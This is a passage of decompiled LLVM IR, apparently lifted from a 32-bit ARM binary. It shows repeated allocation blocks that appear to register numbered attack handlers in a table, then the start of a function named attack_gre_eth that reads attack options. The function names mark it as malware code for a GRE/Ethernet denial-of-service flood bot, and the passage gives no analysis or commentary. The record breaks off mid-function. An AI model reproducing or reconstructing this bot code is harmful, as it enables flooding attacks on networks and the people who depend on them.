  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_bd94.39 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_22464.31, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_c1cc.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_22464.31, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_b608.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_b608.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_22464.31, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_af5c.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_22464.31, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_a864.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_a864.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_22464.31, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_a0b0.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 39164, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_22464.31, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 39164, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 39164, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_22464.31, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9040.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9040.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_22464.31, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_89ac.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_22464.31, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 ptrtoint (i32* @global_var_965c.56 to i32), i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 ptrtoint (i32* @global_var_965c.56 to i32), i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22460.29 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_22461.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_22460.29, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22460.29 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_89ac = load i32, i32* @r4, align 4
  %v6_89ac = load i32, i32* @r5, align 4
  %v24_89ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_89cc = load i32, i32* @r5, align 4
  store i32 %v0_89cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_89dc = load i32, i32* @r4, align 4
  store i32 %v0_89dc, i32* %r0.global-to-local, align 4
  %v5_89e0 = inttoptr i32 %v0_89cc to i32*
  %v6_89e0 = call i32 @attack_get_opt_int(i32 %v0_89dc, i32* %v5_89e0, i32 2, i32 0, i32 %v2_89c8)
  %v1_89ec = urem i32 %v6_89e0, 256
  store i32 %v1_89ec, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89f8 = load i32, i32* @r5, align 4
  store i32 %v0_89f8, i32* %r1.global-to-local, align 4
  %v0_89fc = load i32, i32* @r4, align 4
  store i32 %v0_89fc, i32* %r0.global-to-local, align 4
  %v5_8a00 = trunc i32 %v6_89e0 to i8
  %v6_8a04 = inttoptr i32 %v0_89f8 to i32*
